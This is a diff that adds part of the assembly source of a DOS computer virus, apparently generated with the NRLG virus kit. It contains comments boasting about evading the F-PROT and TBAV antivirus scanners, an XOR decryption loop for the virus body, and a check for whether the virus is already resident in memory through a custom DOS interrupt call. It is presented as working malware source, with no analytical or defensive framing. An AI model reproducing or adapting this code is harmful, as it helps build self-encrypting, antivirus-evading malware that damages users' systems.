@@ -1,0 +1,38 @@
+inc di
+inc di
+;----------------------------------------------------------                                                
+jmp bye                      ;######## BYE BYE F-PROT ! ##########     
+mov ah,4ch
+int 21h
+bye:                         ;#### HEY FRIDRIK! IS ONLY A JMP!!###      
+;-----------------------------------------------------------                               
+mov ah,0bh                   ;######### BYE BYE TBAV ! ##########     
+int 21h                      ;### (CANGE INT AT YOU PLEASURE) ###        
+;----------------------------------------------------------                                   
+loop deci                    ;repeat please!               
+                             ;           
+;*****************************************************************
+;                   #2 DECRYPT ROUTINE                                                    
+;*****************************************************************
+                              ;    
+crypt:                        ;fuck label!                  
+                              ;                
+mov cx,offset fin             ;cx = large of virus                 
+lea di,[offset crypt2] + bp   ;di = first byte to decrypt                  
+;---------------------------------------------------------------                                              
+deci2:                        ;              
+xor byte ptr cs:[di],1        ;decrytion rutine          
+inc di                        ;very simple...            
+loop deci2                    ;           
+;---------------------------------------------------------------
+crypt2:                       ;fuck label!          
+                              ;                  
+MOV AX,0CACAH                 ;call to my resident interrup mask                  
+INT 21H                       ;for chek "I'm is residet?"   
+CMP Bh,0CAH                   ;is equal to CACA?
+JE PUM2                       ;yes! jump to runnig program
+call action
+;*****************************************************************
+; NRLG FUNCTIONS  (SELECTABLE)
+;*****************************************************************
+
